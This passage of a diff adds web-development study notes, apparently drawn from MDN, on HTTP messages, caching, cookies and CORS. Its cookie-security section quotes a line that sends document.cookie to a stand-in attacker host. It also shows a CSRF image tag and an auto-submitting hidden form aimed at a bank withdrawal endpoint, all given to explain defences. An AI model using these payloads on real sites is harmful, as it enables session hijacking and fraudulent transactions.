+            Observe that final empty line, this separates the data block from the header block. As there is no Content-Length provided in an HTTP header, this data block is presented empty, marking the end of the headers, allowing the server to process the request the moment it receives this empty line.
+
+            For example, sending the result of a form:
+                POST /contact_form.php HTTP/1.1
+                Host: developer.mozilla.org
+                Content-Length: 64
+                Content-Type: application/x-www-form-urlencoded
+
+                name=Joe%20User&request=Send%20me%20one%20of%20your%20catalogue
+
+        Request methods:
+            HTTP defines a set of request methods indicating the desired action to be performed upon a resource. Although they can also be nouns, these requests methods are sometimes referred as HTTP verbs. The most common requests are GET and POST:
+                - The GET method requests a data representation of the specified resource. Requests using GET should only retrieve data.
+
+                - The POST method sends data to a server so it may change its state. This is the method often used for HTML Forms.
+
+    Structure of a server response:
+        After the connected agent has sent its request, the web server processes it, and ultimately returns a response. Similar to a client request, a server response is formed of text directives, separated by CRLF, though divided into three blocks:
+            1. The first line, the status line, consists of an acknowledgment of the HTTP version used, followed by a status request (and its brief meaning in human-readable text).
+
+            2. Subsequent lines represent specific HTTP headers, giving the client information about the data sent (e.g. type, data size, compression algorithm used, hints about caching). Similarly to the block of HTTP headers for a client request, these HTTP headers form a block ending with an empty line.
+
+            3. The final block is a data block, which contains the optional data.
+
+        Example responses:
+            Successful web page response:
+                HTTP/1.1 200 OK
+                Content-Type: text/html; charset=utf-8
+                Content-Length: 55743
+                Connection: keep-alive
+                Cache-Control: s-maxage=300, public, max-age=0
+                Content-Language: en-US
+                Date: Thu, 06 Dec 2018 17:37:18 GMT
+                ETag: "2e77ad1dc6ab0b53a2996dfd4653c1c3"
+                Server: meinheld/0.6.1
+                Strict-Transport-Security: max-age=63072000
+                X-Content-Type-Options: nosniff
+                X-Frame-Options: DENY
+                X-XSS-Protection: 1; mode=block
+                Vary: Accept-Encoding,Cookie
+                Age: 7
+
+
+                <!DOCTYPE html>
+                <html lang="en">
+                <head>
+                  <meta charset="utf-8">
+                  <title>A simple webpage</title>
+                </head>
+                <body>
+                  <h1>Simple HTML5 webpage</h1>
+                  <p>Hello, world!</p>
+                </body>
+                </html>
+
+            Notification that the requested resource has permanently moved:
+                HTTP/1.1 301 Moved Permanently
+                Server: Apache/2.4.37 (Red Hat)
+                Content-Type: text/html; charset=utf-8
+                Date: Thu, 06 Dec 2018 17:33:08 GMT
+                Location: https://developer.mozilla.org/ (this is the new link to the resource; it is expected that the user-agent will fetch it)
+                Keep-Alive: timeout=15, max=98
+                Accept-Ranges: bytes
+                Via: Moz-Cache-zlb05
+                Connection: Keep-Alive
+                Content-Length: 325 (the content contains a default page to display if the user-agent is not able to follow the link)
+
+
+                <!DOCTYPE html... (contains a site-customized page helping the user to find the missing resource)
+
+            Notification that the requested resource doesn't exist:
+                HTTP/1.1 404 Not Found
+                Content-Type: text/html; charset=utf-8
+                Content-Length: 38217
+                Connection: keep-alive
+                Cache-Control: no-cache, no-store, must-revalidate, max-age=0
+                Content-Language: en-US
+                Date: Thu, 06 Dec 2018 17:35:13 GMT
+                Expires: Thu, 06 Dec 2018 17:35:13 GMT
+                Server: meinheld/0.6.1
+                Strict-Transport-Security: max-age=63072000
+                X-Content-Type-Options: nosniff
+                X-Frame-Options: DENY
+                X-XSS-Protection: 1; mode=block
+                Vary: Accept-Encoding,Cookie
+                X-Cache: Error from cloudfront
+
+
+                <!DOCTYPE html... (contains a site-customized page helping the user to find the missing resource)
+
+        Response status codes:
+            HTTP response status codes indicate if a specific HTTP request has been successfully completed. Responses are grouped into five classes: informational responses, successful responses, redirects, client errors, and servers errors.
+                - 200: OK. The request has succeeded.
+                - 301: Moved Permanently. This response code means that the URI of requested resource has been changed.
+                - 404: Not Found. The server cannot find the requested resource.
+
+Protocol upgrade mechanism:
+    The HTTP/1.1 protocol provides a special mechanism that can be used to upgrade an already established connection to a different protocol, using the Upgrade header field.
+
+    This mechanism is optional; it cannot be used to insist on a protocol change. Implementations can choose not to take advantage of an upgrade even if they support the new protocol, and in practice, this mechanism is used mostly to bootstrap a WebSockets connection.
+
+    Note also that HTTP/2 explicitly disallows the use of this mechanism; it is specific to HTTP/1.1.
+
+    Upgrading HTTP/1.1 Connections:
+        The Upgrade header field is used by clients to invite the server to switch to one of the listed protocols, in descending preference order.
+
+        Because Upgrade is a hop-by-hop header, it also needs to be listed in the Connection header field. This means that a typical request that includes Upgrade would look something like:
+            GET /index.html HTTP/1.1
+            Host: www.example.com
+            Connection: upgrade
+            Upgrade: example/1, foo/2
+
+        Other headers may be required depending on the requested protocol; for example, WebSocket upgrades allow additional headers to configure details about the WebSocket connection as well as to offer a degree of security in opening the connection. See Upgrading to a WebSocket connection for more details.
+
+        If the server decides to upgrade the connection, it sends back a 101 Switching Protocols response status with an Upgrade header that specifies the protocol(s) being switched to. If it does not (or cannot) upgrade the connection, it ignores the Upgrade header and sends back a regular response (for example, a 200 OK).
+
+        Right after sending the 101 status code, the server can begin speaking the new protocol, performing any additional protocol-specific handshakes as necessary. Effectively, the connection becomes a two-way pipe as soon as the upgraded response is complete, and the request that initiated the upgrade can be completed over the new protocol.
+
+        Common uses for this mechanism:
+            Upgrading to a WebSocket connection:
+                By far, the most common use case for upgrading an HTTP connection is to use WebSockets, which are always implemented by upgrading an HTTP or HTTPS connection. Keep in mind that if you're opening a new connection using the WebSocket API, or any library that does WebSockets, most or all of this is done for you. For example, opening a WebSocket connection is as simple as:
+                    webSocket = new WebSocket("ws://destination.server.ext", "optionalProtocol");
+
+                The WebSocket() constructor does all the work of creating an initial HTTP/1.1 connection then handling the handshaking and upgrade process for you.
+
+                If you need to create a WebSocket connection from scratch, you'll have to handle the handshaking process yourself. After creating the initial HTTP/1.1 session, you need to request the upgrade by adding to a standard request the Upgrade and Connection headers, as follows:
+                    Connection: Upgrade
+                    Upgrade: websocket
+
+HTTP caching:
+    The performance of web sites and applications can be significantly improved by reusing previously fetched resources. Web caches reduce latency and network traffic and thus lessen the time needed to display a representation of a resource. By making use of HTTP caching, Web sites become more responsive.
+
+    Different kinds of caches:
+        Caching is a technique that stores a copy of a given resource and serves it back when requested. When a web cache has a requested resource in its store, it intercepts the request and returns its copy instead of re-downloading from the originating server. This achieves several goals: it eases the load of the server that doesn’t need to serve all clients itself, and it improves performance by being closer to the client, i.e., it takes less time to transmit the resource back. For a web site, it is a major component in achieving high performance. On the other side, it has to be configured properly as not all resources stay identical forever: it is important to cache a resource only until it changes, not longer.
+
+        There are several kinds of caches: these can be grouped into two main categories: private or shared caches. A shared cache is a cache that stores responses for reuse by more than one user. A private cache is dedicated to a single user. This page will mostly talk about browser and proxy caches, but there are also gateway caches, CDN, reverse proxy caches and load balancers that are deployed on web servers for better reliability, performance and scaling of web sites and web applications.
+
+        Private browser caches:
+            A private cache is dedicated to a single user. You might have seen "caching" in your browser's settings already. A browser cache holds all documents downloaded via HTTP by the user. This cache is used to make visited documents available for back/forward navigation, saving, viewing-as-source, etc. without requiring an additional trip to the server. It likewise improves offline browsing of cached content.
+
+        Shared proxy caches:
+            A shared cache is a cache that stores responses to be reused by more than one user. For example, an ISP or your company might have set up a web proxy as part of its local network infrastructure to serve many users so that popular resources are reused a number of times, reducing network traffic and latency.
+
+    Targets of caching operations:
+        HTTP caching is optional, but reusing a cached resource is usually desirable. However, common HTTP caches are typically limited to caching responses to GET and may decline other methods. The primary cache key consists of the request method and target URI (oftentimes only the URI is used as only GET requests are caching targets). Common forms of caching entries are:
+            - Successful results of a retrieval request: a 200 (OK) response to a GET request containing a resource like HTML documents, images or files.
+
+            - Permanent redirects: a 301 (Moved Permanently) response.
+
+            - Error responses: a 404 (Not Found) result page.
+
+            - Incomplete results: a 206 (Partial Content) response.
+
+            - Responses other than GET if something suitable for use as a cache key is defined.
+
+        A cache entry might also consist of multiple stored responses differentiated by a secondary key, if the request is target of content negotiation. For more details see the information about the Vary header below.
+
+    Controlling caching:
+        The Cache-control header:
+            The Cache-Control HTTP/1.1 general-header field is used to specify directives for caching mechanisms in both requests and responses. Use this header to define your caching policies with the variety of directives it provides.
+
+            No caching:
+                The cache should not store anything about the client request or server response. A request is sent to the server and a full response is downloaded each and every time.
+
+                Cache-Control: no-store
+
+            Cache but revalidate:
+                A cache will send the request to the origin server for validation before releasing a cached copy.
+                    Cache-Control: no-cache
+
+            Private and public caches:
+                The "public" directive indicates that the response may be cached by any cache. This can be useful, if pages with HTTP authentication or response status codes that aren't normally cacheable, should now be cached.
+
+                On the other hand, "private" indicates that the response is intended for a single user only and must not be stored by a shared cache. A private browser cache may store the response in this case.
+                    Cache-Control: private
+                    Cache-Control: public
+
+            Expiration:
+                The most important directive here is "max-age=<seconds>" which is the maximum amount of time a resource will be considered fresh. Contrary to Expires, this directive is relative to the time of the request. For the files in the application that will not change, you can usually add aggressive caching. This includes static files such as images, CSS files and JavaScript files, for example.
+
+                For more details, see also the Freshness section below.
+                    Cache-Control: max-age=31536000
+
+            Validation:
+                When using the "must-revalidate" directive, the cache must verify the status of the stale resources before using it and expired ones should not be used. For more details, see the Validation section below.
+                    Cache-Control: must-revalidate
+
+        The Pragma header:
+            Pragma is a HTTP/1.0 header, it is not specified for HTTP responses and is therefore not a reliable replacement for the general HTTP/1.1 Cache-Control header, although it does behave the same as Cache-Control: no-cache, if the Cache-Control header field is omitted in a request. Use Pragma only for backwards compatibility with HTTP/1.0 clients.
+
+    Freshness:
+        Once a resource is stored in a cache, it could theoretically be served by the cache forever. Caches have finite storage so items are periodically removed from storage. This process is called cache eviction. On the other side, some resources may change on the server so the cache should be updated. As HTTP is a client-server protocol, servers can't contact caches and clients when a resource changes; they have to communicate an expiration time for the resource. Before this expiration time, the resource is fresh; after the expiration time, the resource is stale. Eviction algorithms often privilege fresh resources over stale resources. Note that a stale resource is not evicted or ignored; when the cache receives a request for a stale resource, it forwards this request with a If-None-Match to check if it is in fact still fresh. If so, the server returns a 304 (Not Modified) header without sending the body of the requested resource, saving some bandwidth.
+
+        The freshness lifetime is calculated based on several headers. If a "Cache-control: max-age=N" header is specified, then the freshness lifetime is equal to N. If this header is not present, which is very often the case, it is checked if an Expires header is present. If an Expires header exists, then its value minus the value of the Date header determines the freshness lifetime. Finally, if neither header is present, look for a Last-Modified header. If this header is present, then the cache's freshness lifetime is equal to the value of the Date header minus the value of the Last-modified header divided by 10.
+        The expiration time is computed as follows:
+            expirationTime = responseTime + freshnessLifetime - currentAge
+        where responseTime is the time at which the response was received according to the browser.
+
+        Revved resources:
+            The more we use cached resources, the better the responsiveness and the performance of a Web site will be. To optimize this, good practices recommend to set expiration times as far in the future as possible. This is possible on resources that are regularly updated, or often, but is problematic for resources that are rarely and infrequently updated. They are the resources that would benefit the most from caching resources, yet this makes them very difficult to update. This is typical of the technical resources included and linked from each Web pages: JavaScript and CSS files change infrequently, but when they change you want them to be updated quickly.
+
+            Web developers invented a technique that Steve Souders called revving[1]. Infrequently updated files are named in specific way: in their URL, usually in the filename, a revision (or version) number is added. That way each new revision of this resource is considered as a resource on its own that never changes and that can have an expiration time very far in the future, usually one year or even more. In order to have the new versions, all the links to them must be changed, that is the drawback of this method: additional complexity that is usually taken care of by the tool chain used by Web developers. When the infrequently variable resources change they induce an additional change to often variable resources. When these are read, the new versions of the others are also read.
+
+            This technique has an additional benefit: updating two cached resources at the same time will not lead to the situation where the out-dated version of one resource is used in combination with the new version of the other one. This is very important when web sites have CSS stylesheets or JS scripts that have mutual dependencies, i.e., they depend on each other because they refer to the same HTML elements.
+
+            The revision version added to revved resources doesn't need to be a classical revision string like 1.1.3, or even a monotonously growing suite of number. It can be anything that prevent collisions, like a hash or a date.
+
+    Cache validation:
+        When a cached document's expiration time has been reached, it is either validated or fetched again. Validation can only occur if the server provided either a strong validator or a weak validator.
+
+        Revalidation is triggered when the user presses the reload button. It is also triggered under normal browsing if the cached response includes the "Cache-control: must-revalidate" header. Another factor is the cache validation preferences in the Advanced->Cache preferences panel. There is an option to force a validation each time a document is loaded.
+
+        ETags:
+            The ETag response header is an opaque-to-the-useragent value that can be used as a strong validator. That means that a HTTP user-agent, such as the browser, does not know what this string represents and can't predict what its value would be. If the ETag header was part of the response for a resource, the client can issue an If-None-Match in the header of future requests – in order to validate the cached resource.
+
+            The Last-Modified response header can be used as a weak validator. It is considered weak because it only has 1-second resolution. If the Last-Modified header is present in a response, then the client can issue an If-Modified-Since request header to validate the cached document.
+
+            When a validation request is made, the server can either ignore the validation request and response with a normal 200 OK, or it can return 304 Not Modified (with an empty body) to instruct the browser to use its cached copy. The latter response can also include headers that update the expiration time of the cached document.
+
+        Varying responses:
+            This can be useful for serving content dynamically, for example. When using the Vary: User-Agent header, caching servers should consider the user agent when deciding whether to serve the page from cache. If you are serving different content to mobile users, it can help you to avoid that a cache may mistakenly serve a desktop version of your site to your mobile users. In addition, it can help Google and other search engines to discover the mobile version of a page, and might also tell them that no Cloaking is intended.
+
+            Vary: User-Agent:
+                Because the User-Agent header value is different ("varies") for mobile and desktop clients, caches will not be used to serve mobile content mistakenly to desktop users or vice versa.
+
+HTTP cookies:
+    An HTTP cookie (web cookie, browser cookie) is a small piece of data that a server sends to the user's web browser. The browser may store it and send it back with the next request to the same server. Typically, it's used to tell if two requests came from the same browser — keeping a user logged-in, for example. It remembers stateful information for the stateless HTTP protocol.
+
+    Cookies are mainly used for three purposes:
+        Session management:
+            Logins, shopping carts, game scores, or anything else the server should remember
+        Personalization:
+            User preferences, themes, and other settings
+        Tracking:
+            Recording and analyzing user behavior
+
+    Cookies were once used for general client-side storage. While this was legitimate when they were the only way to store data on the client, it is recommended nowadays to prefer modern storage APIs. Cookies are sent with every request, so they can worsen performance (especially for mobile data connections). Modern APIs for client storage are the Web storage API (localStorage and sessionStorage) and IndexedDB.
+
+    Creating cookies:
+        When receiving an HTTP request, a server can send a Set-Cookie header with the response. The cookie is usually stored by the browser, and then the cookie is sent with requests made to the same server inside a Cookie HTTP header. An expiration date or duration can be specified, after which the cookie is no longer sent. Additionally, restrictions to a specific domain and path can be set, limiting where the cookie is sent.
+
+        The Set-Cookie and Cookie headers:
+            The Set-Cookie HTTP response header sends cookies from the server to the user agent. A simple cookie is set like this:
+                Set-Cookie: <cookie-name>=<cookie-value>
+
+            This header from the server tells the client to store a cookie.
+                HTTP/2.0 200 OK
+                Content-type: text/html
+                Set-Cookie: yummy_cookie=choco
+                Set-Cookie: tasty_cookie=strawberry
+
+                [page content]
+
+            Now, with every new request to the server, the browser will send back all previously stored cookies to the server using the Cookie header.
+                GET /sample_page.html HTTP/2.0
+                Host: www.example.org
+                Cookie: yummy_cookie=choco; tasty_cookie=strawberry
+
+        Session cookies:
+            The cookie created above is a session cookie: it is deleted when the client shuts down, because it didn't specify an Expires or Max-Age directive. However, web browsers may use session restoring, which makes most session cookies permanent, as if the browser was never closed.
+
+        Permanent cookies:
+            Instead of expiring when the client closes, permanent cookies expire at a specific date (Expires) or after a specific length of time (Max-Age).
+
+                Set-Cookie: id=a3fWa; Expires=Wed, 21 Oct 2015 07:28:00 GMT;
+
+        Secure and HttpOnly cookies:
+            A secure cookie is only sent to the server with an encrypted request over the HTTPS protocol. Even with Secure, sensitive information should never be stored in cookies, as they are inherently insecure and this flag can't offer real protection. Starting with Chrome 52 and Firefox 52, insecure sites (http:) can't set cookies with the Secure directive.
+
+            To help mitigate cross-site scripting (XSS) attacks, HttpOnly cookies are inaccessible to JavaScript's Document.cookie API; they are only sent to the server. For example, cookies that persist server-side sessions don't need to be available to JavaScript, and the HttpOnly flag should be set.
+
+                Set-Cookie: id=a3fWa; Expires=Wed, 21 Oct 2015 07:28:00 GMT; Secure; HttpOnly
+
+        Scope of cookies:
+            The Domain and Path directives define the scope of the cookie: what URLs the cookies should be sent to.
+
+            Domain specifies allowed hosts to receive the cookie. If unspecified, it defaults to the host of the current document location, excluding subdomains. If Domain is specified, then subdomains are always included.
+
+            For example, if Domain=mozilla.org is set, then cookies are included on subdomains like developer.mozilla.org.
+
+            Path indicates a URL path that must exist in the requested URL in order to send the Cookie header. The %x2F ("/") character is considered a directory separator, and subdirectories will match as well.
+
+            For example, if Path=/docs is set, these paths will match:
+                - /docs
+                - /docs/Web/
+                - /docs/Web/HTTP
+
+        Set and Read Cookies in browser console:
+            Set:
+                > document.cookie = "promo_shown=1; Max-Age=2600000; Secure"
+                < "promo_shown=1; Max-Age=2600000; Secure"
+
+            Read:
+                > document.cookie;
+                < "promo_shown=1; color_theme=peachpuff; sidebar_loc=left"
+
+        First-party and third-party cookies.
+            https://web.dev/samesite-cookies-explained/
+            First-party:
+                Cookies that match the domain of the current site, i.e. what's displayed in the browser's address bar, are referred to as first-party cookies.
+
+            Third-party:
+                Cookies from domains other than the current site are referred to as third-party cookies.
+
+                Usage:
+                    If your visitor is already signed in to YouTube, that session is being made available in the embedded player by a third-party cookie—meaning that "Watch later" button will just save the video in one go rather than prompting them to sign in or having to navigate them away from your page and back over to YouTube.
+
+                Security Problem:
+                    Cross-site request forgery (CSRF) attacks rely on the fact that cookies are attached to any request to a given origin, no matter who initiates the request. For example, if you visit evil.example then it can trigger requests to your-blog.example, and your browser will happily attach the associated cookies. If your blog isn't careful with how it validates those requests then evil.example could trigger actions like deleting posts or adding their own content.
+
+        SameSite cookies:
+            https://web.dev/samesite-cookies-explained/
+            SameSite cookies let servers require that a cookie shouldn't be sent with cross-site (where Site is defined by the registrable domain) requests, which provides some protection against cross-site request forgery attacks (CSRF).
+
+            It's helpful to understand exactly what 'site' means here. The site is the combination of the domain suffix and the part of the domain just before it. For example, the www.web.dev domain is part of the web.dev site.
+
+            SameSite cookies are relatively new and supported by all major browsers.
+
+            Here is an example:
+                Set-Cookie: key=value; SameSite=Strict
+
+            The SameSite attribute can have one of three values (case-insensitive):
+                None:
+                    The browser will send cookies with both cross-site requests and same-site requests.
+
+                    Cookies with SameSite=None must also specify Secure, meaning they require a secure context.
+
+                Strict:
+                    The browser will only send cookies for same-site requests (requests originating from the site that set the cookie). If the request originated from a different URL than the URL of the current location, none of the cookies tagged with the Strict attribute will be included.
+
+                Lax:
+                    Same-site cookies are withheld on cross-site subrequests, such as calls to load images or frames, but will be sent when a user navigates to the URL from an external site; for example, by following a link.
+
+                    Cookies without a SameSite attribute will be treated as SameSite=Lax.
+
+            However, new versions of browsers default to SameSite=Lax. In other words, cookies with no SameSite attribute set are now handled as if the value of the SameSite attribute is set to Lax — which means that cookies will automatically be sent only in a first party context. To specify that cookies are to be sent in both same-site and cross-origin requests, the value must be explicitly set to None.
+
+        Cookie prefixes:
+            The design of the cookie mechanism is such that a server is unable to confirm a cookie was set on a secure origin or indeed, tell where a cookie was originally set. Recall that a subdomain such as application.example.com can set a cookie that will be sent with requests to example.com or other sub-domains by setting the Domain attribute:
+                Set-Cookie: CSRF=e8b667; Secure; Domain=example.com
+
+            If a vulnerable application is available on a sub-domain, this mechanism can be abused in a session fixation attack. When the user visits a page on the parent domain (or another subdomain), the application may trust the existing value sent in the user's cookie. This could allow an attacker to bypass CSRF protection or hijack a session after the user logs in.
+
+            Alternatively, if the parent domain does not use HSTS with includeSubdomains set, a user subject to an active MitM (perhaps connected to an open WiFi network) could be served a response with a Set-Cookie header from a non-existent sub-domain. The end result would be much the same, with the browser storing the illegitimate cookie and sending it to all other pages under example.com.
+
+            Session fixation should primarily be mitigated by regenerating session cookie values when the user authenticates (even if a cookie already exists) and by tieing any CSRF token to the user. As a defence in depth measure, however, it is possible to use cookie prefixes to assert specific facts about the cookie. Two prefixes are available:
+                __Host-
+                    If a cookie name has this prefix, it will only be accepted in a Set-Cookie directive if it is marked Secure, was sent from a secure origin, does not include a Domain attribute, and has the Path attribute set to /. In this way, these cookies can be seen as "domain-locked".
+
+                __Secure-
+                    If a cookie name has this prefix, it will only be accepted in a Set-Cookie directive if it is marked Secure and was sent from a secure origin. This is weaker than the __Host- prefix.
+
+            Cookies sent which are not compliant will be rejected by the browser. Note that this ensures that if a sub-domain were to create a cookie with this name, it would be either be confined to the sub-domain or ignored completely. As the application server will only check for a specific cookie name when determining if the user is authenticated or a CSRF token is correct, this effectively acts as a defence measure against session fixation.
+
+            On the application server, the web application must check for the full cookie name including the prefix—user agents will not strip the prefix from the cookie before sending it in a request's Cookie header.
+
+        JavaScript access using Document.cookie:
+            New cookies can also be created via JavaScript using the Document.cookie property, and if the HttpOnly flag is not set, existing cookies can be accessed from JavaScript as well.
+                document.cookie = "yummy_cookie=choco";
+                document.cookie = "tasty_cookie=strawberry";
+                console.log(document.cookie);
+                // logs "yummy_cookie=choco; tasty_cookie=strawberry"
+
+            Cookies created via JavaScript cannot include the HttpOnly flag.
+
+            Please note the security issues in the Security section below. Cookies available to JavaScript can be stolen through XSS.
+
+    Security:
+        Information should be stored in cookies with the understanding that all cookie values will be visible to and can be changed by the end-user. Depending on the application, it may be desirable to use an opaque identifier which is looked-up server-side or investigate alternative authentication/confidentiality mechanisms such as JSON Web Tokens.
+
+        Session hijacking and XSS:
+            Cookies are often used in web application to identify a user and their authenticated session, so stealing a cookie can lead to hijacking the authenticated user's session. Common ways to steal cookies include Social Engineering or exploiting an XSS vulnerability in the application.
+                (new Image()).src = "http://www.evil-domain.com/steal-cookie?cookie=" + document.cookie;
+
+            The HttpOnly cookie attribute can help to mitigate this attack by preventing access to cookie value through JavaScript. Exfiltration avenues can be limited by deploying a strict Content-Security-Policy.
+
+        Cross-site request forgery (CSRF):
+            Wikipedia mentions a good example for CSRF. In this situation, someone includes an image that isn’t really an image (for example in an unfiltered chat or forum), instead it really is a request to your bank’s server to withdraw money:
+                <img src="https://bank.example.com/withdraw?account=bob&amount=1000000&for=mallory">
+
+            Now, if you are logged into your bank account and your cookies are still valid (and there is no other validation), you will transfer money as soon as you load the HTML that contains this image. For endpoints that require a POST request, it's possible to programmatically trigger a <form> submit (perhaps in an invisible <iframe>) when the page is loaded:
+                <form action="https://bank.example.com/withdraw" method="POST">
+                  <input type="hidden" name="account" value="bob">
+                  <input type="hidden" name="amount" value="1000000">
+                  <input type="hidden" name="for" value="mallory">
+                </form>
+                <script>window.addEventListener('DOMContentLoaded', (e) => { document.querySelector('form').submit(); }</script>
+
+            There are a few techniques that should be used to prevent this from happening:
+                - GET endpoints should be idempotent—actions that enact a change and do not simply retrieve data should require sending a POST (or other HTTP method) request. POST endpoints should not interchangeably accept GET requests with parameters in the query string.
+
+                - A CSRF token should be included in <form> elements via a hidden input field. This token should be unique per user and stored (for example, in a cookie) such that the server can look up the expected value when the request is sent. For all non-GET requests that have the potential to perform an action, this input field should be compared against the expected value. If there is a mismatch, the request should be aborted.
+
+                    - This method of protection relies on an attacker being unable to predict the user's assigned CSRF token. The token should be regenerated on sign-in.
+
+                - Cookies that are used for sensitive actions (such as session cookies) should have a short lifetime with the SameSite attribute set to Strict or Lax. (See SameSite cookies above). In supporting browsers, this will have the effect of ensuring that the session cookie is not sent along with cross-site requests and so the request is effectively unauthenticated to the application server.
+
+                - Both CSRF tokens and SameSite cookies should be deployed. This ensures all browsers are protected and provides protection where SameSite cookies cannot help (such as attacks originating from a separate subdomain).
+
+                - For more prevention tips, see the OWASP CSRF prevention cheat sheet.
+
+    Tracking and privacy:
+        Third-party cookies:
+            Cookies have a domain associated to them. If this domain is the same as the domain of the page you are on, the cookies is said to be a first-party cookie. If the domain is different, it is said to be a third-party cookie. While first-party cookies are sent only to the server setting them, a web page may contain images or other components stored on servers in other domains (like ad banners). Cookies that are sent through these third-party components are called third-party cookies and are mainly used for advertising and tracking across the web. See for example the types of cookies used by Google. Most browsers allow third-party cookies by default, but there are add-ons available to block them (for example, Privacy Badger by the EFF).
+
+            If you are not disclosing third-party cookies, consumer trust might get harmed if cookie use is discovered. A clear disclosure (such as in a privacy policy) tends to eliminate any negative effects of a cookie discovery. Some countries also have legislation about cookies. See for example Wikimedia Foundation's cookie statement.
+
+        Do-Not-Track:
+            There are no legal or technological requirements for its use, but the DNT header can be used to signal that a web application should disable either its tracking or cross-site user tracking of an individual user. See the DNT header for more information.
+
+        EU cookie directive:
+            Requirements for cookies across the EU are defined in Directive 2009/136/EC of the European Parliament and came into effect on 25 May 2011. A directive is not a law by itself, but a requirement for EU member states to put laws in place that meet the requirements of the directive. The actual laws can differ from country to country.
+
+            In short the EU directive means that before somebody can store or retrieve any information from a computer, mobile phone or other device, the user must give informed consent to do so. Many websites have added banners (AKA "cookie banners") since then to inform the user about the use of cookies.
+
+            For more, see this Wikipedia section and consult state laws for the latest and most accurate information.
+
+        Zombie cookies and Evercookies:
+            A more radical approach to cookies are zombie cookies or "Evercookies" which are recreated after their deletion and are intentionally hard to delete forever. They are using the Web storage API, Flash Local Shared Objects and other techniques to recreate themselves whenever the cookie's absence is detected.
+
+Cross-Origin Resource Sharing (CORS):
+    Cross-Origin Resource Sharing (CORS) is a mechanism that uses additional HTTP headers to tell browsers to give a web application running at one origin, access to selected resources from a different origin. A web application executes a cross-origin HTTP request when it requests a resource that has a different origin (domain, protocol, or port) from its own.
+
+    An example of a cross-origin request: the front-end JavaScript code served from https://domain-a.com uses XMLHttpRequest to make a request for https://domain-b.com/data.json.
+
+    For security reasons, browsers restrict cross-origin HTTP requests initiated from scripts. For example, XMLHttpRequest and the Fetch API follow the same-origin policy. This means that either a Response to a Request or to an explicit Solicitation, which may be required for some HTTP requests, can include cross-origin restrictions which will be applied by the browser so that a cross-origin request to a specific site using XMLHttpRequest/fetch may not be possible.
+
+    The CORS mechanism supports secure cross-origin requests and data transfers between browsers and servers. Modern browsers use CORS in APIs such as XMLHttpRequest or Fetch to mitigate the risks of cross-origin HTTP requests.
+
+    What requests use CORS?
+        This cross-origin sharing standard can enable cross-site HTTP requests for:
+            - Invocations of the XMLHttpRequest or Fetch APIs, as discussed above.
+            - Web Fonts (for cross-domain font usage in @font-face within CSS), so that servers can deploy TrueType fonts that can only be cross-site loaded and used by web sites that are permitted to do so.
+            - WebGL textures.
+            - Images/video frames drawn to a canvas using drawImage().
+            - CSS Shapes from images.
+
+        This article is a general discussion of Cross-Origin Resource Sharing and includes a discussion of the necessary HTTP headers.
+
+    Functional overview:
+        The Cross-Origin Resource Sharing standard works by adding new HTTP headers that let servers describe which origins are permitted to read that information from a web browser. Additionally, for HTTP request methods that can cause side-effects on server data (in particular, HTTP methods other than GET, or POST with certain MIME types), the specification mandates that browsers "preflight" the request, soliciting supported methods from the server with the HTTP OPTIONS request method, and then, upon "approval" from the server, sending the actual request. Servers can also inform clients whether "credentials" (such as Cookies and HTTP Authentication) should be sent with requests.
+
+        CORS failures result in errors, but for security reasons, specifics about the error are not available to JavaScript. All the code knows is that an error occurred. The only way to determine what specifically went wrong is to look at the browser's console for details.
+
+        Subsequent sections discuss scenarios, as well as provide a breakdown of the HTTP headers used.
+
+    Examples of access control scenarios:
+        We present three scenarios that demonstrate how Cross-Origin Resource Sharing works. All these examples use XMLHttpRequest, which can make cross-site requests in any supporting browser.
+
+        The JavaScript snippets in these sections (and running instances of the server code that correctly handles these cross-site requests) can be found "in action" at http://arunranga.com/examples/access-control/, and will work in browsers that support cross-site XMLHttpRequest.
+
+        A discussion of Cross-Origin Resource Sharing from a server perspective (including PHP code snippets) can be found in the Server-Side Access Control (CORS) article.
+
+        Simple requests:
+            Some requests don’t trigger a CORS preflight. Those are called “simple requests” in this article, though the Fetch spec (which defines CORS) doesn’t use that term. A “simple request” is one that meets all the following conditions:
+                - One of the allowed methods:
+                    - GET
+                    - HEAD
+                    - POST
+
+                - Apart from the headers automatically set by the user agent (for example, Connection, User-Agent, or the other headers defined in the Fetch spec as a “forbidden header name”), the only headers which are allowed to be manually set are those which the Fetch spec defines as a “CORS-safelisted request-header”, which are:
+                    - Accept
+                    - Accept-Language
+                    - Content-Language
+                    - Content-Type (but note the additional requirements below)
+                    - DPR
+                    - Downlink
+                    - Save-Data
+                    - Viewport-Width
+                    - Width
+
+                - The only allowed values for the Content-Type header are:
+                    - application/x-www-form-urlencoded
+                    - multipart/form-data
+                    - text/plain
+
+                - No event listeners are registered on any XMLHttpRequestUpload object used in the request; these are accessed using the XMLHttpRequest.upload property.
+
+                - No ReadableStream object is used in the request.
+
+            Note: These are the same kinds of cross-site requests that web content can already issue, and no response data is released to the requester unless the server sends an appropriate header. Therefore, sites that prevent cross-site request forgery have nothing new to fear from HTTP access control.
+
+            For example, suppose web content at https://foo.example wishes to invoke content on domain https://bar.other. Code of this sort might be used in JavaScript deployed on foo.example:
+                const xhr = new XMLHttpRequest();
+                const url = 'https://bar.other/resources/public-data/';
+
+                xhr.open('GET', url);
+                xhr.onreadystatechange = someHandler;
+                xhr.send();
+
+            Let's look at what the browser will send to the server in this case, and let's see how the server responds:
+                GET /resources/public-data/ HTTP/1.1
+                Host: bar.other
+                User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:71.0) Gecko/20100101 Firefox/71.0
+                Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+                Accept-Language: en-us,en;q=0.5
+                Accept-Encoding: gzip,deflate
+                Connection: keep-alive
+                Origin: https://foo.example
+
+            The request header of note is Origin, which shows that the invocation is coming from https://foo.example.
+                HTTP/1.1 200 OK
+                Date: Mon, 01 Dec 2008 00:23:53 GMT
+                Server: Apache/2
+                Access-Control-Allow-Origin: *
+                Keep-Alive: timeout=2, max=100
+                Connection: Keep-Alive
+                Transfer-Encoding: chunked
+                Content-Type: application/xml
+
+                […XML Data…]
+
+            In response, the server sends back an Access-Control-Allow-Origin header. The use of the Origin header and of Access-Control-Allow-Origin show the access control protocol in its simplest use. In this case, the server responds with Access-Control-Allow-Origin: *, which means that the resource can be accessed by any domain. If the resource owners at https://bar.other wished to restrict access to the resource to requests only from https://foo.example, they would send:
+                Access-Control-Allow-Origin: https://foo.example
+
